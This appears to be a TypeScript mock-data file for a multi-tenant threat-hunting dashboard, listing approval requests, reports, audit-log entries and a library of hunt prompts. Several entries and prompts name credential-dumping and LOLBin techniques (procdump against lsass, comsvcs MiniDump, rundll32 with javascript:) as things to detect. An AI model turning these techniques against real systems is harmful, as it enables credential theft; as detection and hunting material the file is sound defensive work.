  { id: "ap-3101", tenantId: "t-initech", component: "lotl_engine", actionType: "hunt_promotion", summary: "Escalate L-0117 (procdump against lsass on FIN-LT-0221) to a hunt", payload: { finding: "L-0117", tool: "procdump", entity: "FIN-LT-0221" }, requestedAt: "2026-09-08T07:35:00Z", requestedBy: "LOTL engine (scheduled)", decision: null, tier: "sync", maturityRequired: 4 },
  { id: "ap-3100", tenantId: "t-umbrella", component: "detection_compiler", actionType: "detection_deploy", summary: "Deploy b71d02c9 (Unauthorized Local Administrator Addition) to Defender via lucene", payload: { rule_id: "b71d02c9", backend: "lucene", native_severity: "critical", dry_run: false }, requestedAt: "2026-09-06T02:04:00Z", requestedBy: "Devon Alcaraz", decision: null, tier: "sync", backtest: 11 },
  { id: "ap-3099", tenantId: "t-initech", component: "detection_compiler", actionType: "detection_deploy", summary: "Deploy f9081ab7 (Beaconing to Newly Registered Domain) to Elastic via eql", payload: { rule_id: "f9081ab7", backend: "eql", native_severity: "high", dry_run: false }, requestedAt: "2026-09-07T03:02:00Z", requestedBy: "Devon Alcaraz", decision: null, tier: "sync", backtest: 42 },
  { id: "ap-3098", tenantId: "t-globex", component: "reporting_service", actionType: "report_release", summary: "Release weekly report for Sep 1 to Sep 7 to Globex Health", payload: { report: "R-2036", recipients: ["r.patel@globex.example"] }, requestedAt: "2026-09-08T06:10:00Z", requestedBy: "Reporting service", decision: null, tier: "sync" },
  { id: "ap-3097", tenantId: "t-stark", component: "dashboard_service", actionType: "hunt_promotion", summary: "Promote egress outlier O-905 (ENG-WS-0311, 3.1 GB to relay host) to a hunt", payload: { outlier: "O-905" }, requestedAt: "2026-09-08T06:02:00Z", requestedBy: "Dashboard service", decision: null, tier: "sync" },
  { id: "ap-3096", tenantId: "t-globex", component: "orchestrator", actionType: "telemetry_query", summary: "telemetry.query process_execution on 4 hosts, 7 days, filter AnyDesk.exe", payload: { query_type: "process_execution", filters: { process_name: ["AnyDesk.exe"] }, limit: 500 }, requestedAt: "2026-09-08T11:20:00Z", requestedBy: "Mira Okonkwo", decision: null, tier: "batchable" },
  { id: "ap-3095", tenantId: "t-acme", component: "orchestrator", actionType: "telemetry_query", summary: "telemetry.query process_execution, rundll32.exe with javascript:, 48h", payload: { query_type: "process_execution", filters: { process_name: ["rundll32.exe"], command_line_contains: ["javascript:"] }, limit: 500 }, requestedAt: "2026-09-02T14:06:00Z", requestedBy: "Paul Runtalan", decision: "approved", decidedBy: "a-paul", decidedAt: "2026-09-02T14:06:20Z", tier: "batchable" },
  { id: "ap-3094", tenantId: "t-acme", component: "detection_compiler", actionType: "detection_deploy", summary: "Deploy 8f2c1a4e (Rundll32 JavaScript Protocol Execution) to Splunk via spl", payload: { rule_id: "8f2c1a4e", backend: "spl", native_severity: "high" }, requestedAt: "2026-09-03T09:45:00Z", requestedBy: "Devon Alcaraz", decision: "approved", decidedBy: "a-dev", decidedAt: "2026-09-03T10:11:00Z", tier: "sync", backtest: 3 },
  { id: "ap-3093", tenantId: "t-umbrella", component: "orchestrator", actionType: "case_create", summary: "case.create on Defender for H-0138 (svc-deploy unauthorized admin additions)", payload: { hunt: "H-0138", severity: "high" }, requestedAt: "2026-08-27T13:05:00Z", requestedBy: "Devon Alcaraz", decision: "approved", decidedBy: "a-paul", decidedAt: "2026-08-27T13:09:00Z", tier: "sync" },
  { id: "ap-3092", tenantId: "t-vandelay", component: "orchestrator", actionType: "telemetry_query", summary: "telemetry.query authentication_event, all hosts, 30 days, no filter", payload: { query_type: "authentication_event", limit: 5000 }, requestedAt: "2026-09-04T16:00:00Z", requestedBy: "Mira Okonkwo", decision: "denied", decidedBy: "a-paul", decidedAt: "2026-09-04T16:03:00Z", tier: "batchable" },
];

export const reports: Report[] = [
  { id: "R-2036", tenantId: "t-globex", period: "weekly", start: "2026-09-01", end: "2026-09-07", status: "draft", hunts: 2, detections: 0, lotlDispositions: 3, outliers: 4, gitPath: "tenant-globex/reports/weekly/2026-W36.md" },
  { id: "R-2035", tenantId: "t-acme", period: "weekly", start: "2026-09-01", end: "2026-09-07", status: "draft", hunts: 3, detections: 1, lotlDispositions: 2, outliers: 3, gitPath: "tenant-acme/reports/weekly/2026-W36.md" },
  { id: "R-2034", tenantId: "t-initech", period: "weekly", start: "2026-09-01", end: "2026-09-07", status: "released", hunts: 5, detections: 1, lotlDispositions: 1, outliers: 2, releasedBy: "a-lena", releasedAt: "2026-09-08T09:00:00Z", gitPath: "tenant-initech/reports/weekly/2026-W36.md" },
  { id: "R-2033", tenantId: "t-umbrella", period: "monthly", start: "2026-08-01", end: "2026-08-31", status: "released", hunts: 4, detections: 1, lotlDispositions: 6, outliers: 5, releasedBy: "a-lena", releasedAt: "2026-09-02T15:30:00Z", gitPath: "tenant-umbrella/reports/monthly/2026-08.md" },
  { id: "R-2032", tenantId: "t-stark", period: "monthly", start: "2026-08-01", end: "2026-08-31", status: "released", hunts: 6, detections: 0, lotlDispositions: 4, outliers: 2, releasedBy: "a-lena", releasedAt: "2026-09-02T15:32:00Z", gitPath: "tenant-stark/reports/monthly/2026-08.md" },
  { id: "R-2031", tenantId: "t-acme", period: "monthly", start: "2026-08-01", end: "2026-08-31", status: "released", hunts: 11, detections: 2, lotlDispositions: 8, outliers: 7, releasedBy: "a-lena", releasedAt: "2026-09-02T15:35:00Z", gitPath: "tenant-acme/reports/monthly/2026-08.md" },
];

export const auditLog: AuditEntry[] = [
  { id: 88231, tenantId: "t-initech", component: "lotl_engine", action: "finding.created", requestHash: "3e1f9c…a02b", at: "2026-09-08T07:31:04Z" },
  { id: 88232, tenantId: "t-initech", component: "approval_service", action: "approval.requested", requestHash: "b77c02…19de", approvalId: "ap-3101", at: "2026-09-08T07:35:00Z" },
  { id: 88233, tenantId: "t-globex", analystId: "a-mira", component: "orchestrator", action: "session.opened", requestHash: "0a4d55…7c31", at: "2026-09-08T11:18:40Z" },
  { id: 88234, tenantId: "t-globex", analystId: "a-mira", component: "git_gateway", action: "context.read", requestHash: "f0e2a9…64bb", at: "2026-09-08T11:18:41Z" },
  { id: 88235, tenantId: "t-globex", analystId: "a-mira", component: "orchestrator", action: "tool.proposed", tool: "telemetry.query", requestHash: "9c8b17…e4f0", approvalId: "ap-3096", at: "2026-09-08T11:20:02Z" },
  { id: 88236, tenantId: "t-acme", analystId: "a-paul", component: "credential_broker", action: "credential.issued", tool: "telemetry.enrich", requestHash: "51d3e0…8a77", at: "2026-09-08T12:02:11Z" },
  { id: 88237, tenantId: "t-acme", analystId: "a-paul", component: "mcp_gateway", action: "tool.executed", tool: "telemetry.enrich", requestHash: "51d3e0…8a77", at: "2026-09-08T12:02:12Z" },
  { id: 88238, tenantId: "t-acme", analystId: "a-paul", component: "credential_broker", action: "credential.revoked", tool: "telemetry.enrich", requestHash: "51d3e0…8a77", at: "2026-09-08T12:02:13Z" },
  { id: 88239, tenantId: "t-stark", component: "mcp_gateway", action: "server.health.down", tool: "crowdstrike", requestHash: "—", at: "2026-09-08T13:38:22Z" },
  { id: 88240, tenantId: "t-globex", component: "reporting_service", action: "report.drafted", requestHash: "aa19c3…02e1", at: "2026-09-08T06:10:00Z" },
  { id: 88241, tenantId: "t-initech", analystId: "a-lena", component: "approval_service", action: "approval.decided", requestHash: "c3d4e5…f6a7", approvalId: "ap-3080", at: "2026-09-08T09:00:00Z" },
  { id: 88242, tenantId: "t-initech", analystId: "a-lena", component: "reporting_service", action: "report.released", requestHash: "c3d4e5…f6a7", at: "2026-09-08T09:00:02Z" },
  { id: 88243, tenantId: "t-acme", analystId: "a-paul", component: "git_gateway", action: "hunt.committed", requestHash: "c41e9b2", at: "2026-09-02T15:47:10Z" },
  { id: 88244, tenantId: "t-vandelay", analystId: "a-paul", component: "approval_service", action: "approval.decided", tool: "telemetry.query", requestHash: "77ab01…3c9d", approvalId: "ap-3092", at: "2026-09-04T16:03:00Z" },
  { id: 88245, tenantId: "t-umbrella", analystId: "a-dev", component: "detection_compiler", action: "backtest.completed", requestHash: "e8f7a6…b5c4", at: "2026-09-06T02:04:00Z" },
];

export const promptLibrary = [
  { id: "PL-017", title: "LOLBin script hosts", prompt: "Look for rundll32, mshta, regsvr32, or wscript launched by Office applications or browsers in the last 48 hours." },
  { id: "PL-022", title: "Scheduled task persistence", prompt: "Find scheduled tasks created in the last 7 days whose action points to a user-writable path." },
  { id: "PL-031", title: "Credential dumping precursors", prompt: "Search for processes opening handles to lsass.exe, or procdump, comsvcs MiniDump, or rundll32 with lsass arguments, in the last 14 days." },
  { id: "PL-044", title: "Beaconing sweep", prompt: "Across all selected tenants, identify hosts with fixed-interval outbound connections to domains registered in the last 30 days." },
];

// helpers
export const tenantById = (id: string) => tenants.find((t) => t.id === id)!;
export const analystById = (id?: string) => analysts.find((a) => a.id === id);
export const dashboardById = (id: string) => dashboards.find((d) => d.id === id);
export const detectionById = (id: string) => detections.find((d) => d.id === id);
export const huntById = (id: string) => hunts.find((h) => h.id === id);
